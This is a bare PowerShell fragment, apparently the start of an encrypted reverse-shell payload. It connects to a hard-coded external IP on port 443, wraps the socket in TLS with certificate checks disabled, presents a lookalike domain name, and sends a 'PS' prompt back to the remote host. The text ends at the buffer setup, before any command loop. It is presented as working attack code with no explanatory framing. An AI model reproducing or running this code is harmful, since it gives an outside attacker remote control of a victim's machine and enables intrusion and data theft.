$a = New-Object Net.Sockets.TcpClient('120.156.138.160', 443)
$b = $a.GetStream()
$c = New-Object System.Net.Security.SslStream($b,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
$c.AuthenticateAsClient('lvanhoe.com', $null, "Tls12", $false)
$d = new-object System.IO.StreamWriter($c)
$d.Write('PS ' + (pwd).Path + '> ')
$d.flush()
[byte[]]$e = 0..65535|%{0};
